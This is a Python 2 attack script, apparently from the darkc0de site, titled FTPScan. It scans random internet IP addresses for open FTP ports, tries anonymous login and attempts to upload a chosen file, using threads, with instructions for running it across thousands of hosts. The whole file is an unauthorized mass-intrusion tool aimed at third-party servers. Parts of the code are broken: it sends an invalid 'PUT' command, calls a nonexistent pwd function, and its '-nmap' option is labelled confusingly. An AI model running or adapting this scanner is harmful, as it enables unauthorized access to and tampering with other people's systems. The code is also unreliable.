#!/usr/bin/python
#Searches random ips for ftp port open then checks
#anonymous login and attempts upload. Uses nmap or 
#sockets and includes threading.

#Changlog v1.1: added threading, checks if uploading allowed, +- nmap option

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import commands, sys, StringIO, re, threading, time, ftplib, random, socket
from ftplib import FTP

def nmapscan():
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 -iR 1 -p 21 | grep -B 3 open')[1]).readlines()

	for tmp in nmap:
		ip = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ip: 
			ipaddr = ip[0]
			ftpcheck(ipaddr)
			
def servscan():
	
	ipaddr = rand()

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(15)
		s.connect((ipaddr, 21))
		s.close()
		ftpcheck(ipaddr)
	except socket.error:
		pass
	
def rand():
	a = random.randrange(255) + 1
	b = random.randrange(255) + 1
	c = random.randrange(255) + 1
	d = random.randrange(255) + 1
	ip = "%d.%d.%d.%d" % (a,b,c,d)
	return ip
							
def ftpcheck(ipaddr):
	
	try:
		print "\n[+] Checking anonymous login:",ipaddr
		ftp = ftplib.FTP(ipaddr)
		print "[+] Response:",ftp.getwelcome()
		ftp.login()
		ftp.retrlines('LIST')
		print "\t[!] Anonymous login successful:",ipaddr
		print "[+] Testing Upload"
		ftp.sendcmd('PUT '+file)
		print "[+] Currect Directory:",ftplib.pwd()
		print "\t[!] Upload successful:",ipaddr
		ftp.quit()
	except (ftplib.all_errors), msg: 
		print "[-] An error occurred:",msg,"\n"
	
#................................................
print "\n   d3hydr8[at]gmail[dot]com FTPScan v1.1"
print "----------------------------------------------\n"

if len(sys.argv) != 3 and len(sys.argv) != 4:
	print "Usage: ./ftprand.py <number of ips to scan> <file to upload>\n"
	print "\t[option]"
	print "\t   -nmap : Uses sockets instead of nmap to find open ports"
	print "\nExample: ./ftprand.py 10000 /home/d3hydr8/test.txt -nmap\n"
	sys.exit(0)

num = int(sys.argv[1])
file = sys.argv[2]
try:
  	open(file, "r")
except(IOError): 
  	print "\n[-] Error: Check your file path\n"
  	sys.exit(1)
print "[+] Scanning:",num
print "[+] Upload File:",file
try:
	if sys.argv[3].lower() == "-nmap":
		print "[+] Socket Scan Mode\n"
		for x in xrange(num):
			print "[-]",x+1,"of",num
			#Change this limit for faster results.
			time.sleep(5)
			threading.Thread(target=servscan).start()
	else:
		print "\n[-] Error: Check your options\n"
		sys.exit(1)
except(IndexError):
	print "[+] Nmap Mode\n"
	for x in xrange(num):
		print "[-]",x+1,"of",num
		#Change this limit for faster results.
		time.sleep(5)
		threading.Thread(target=nmapscan).start()
	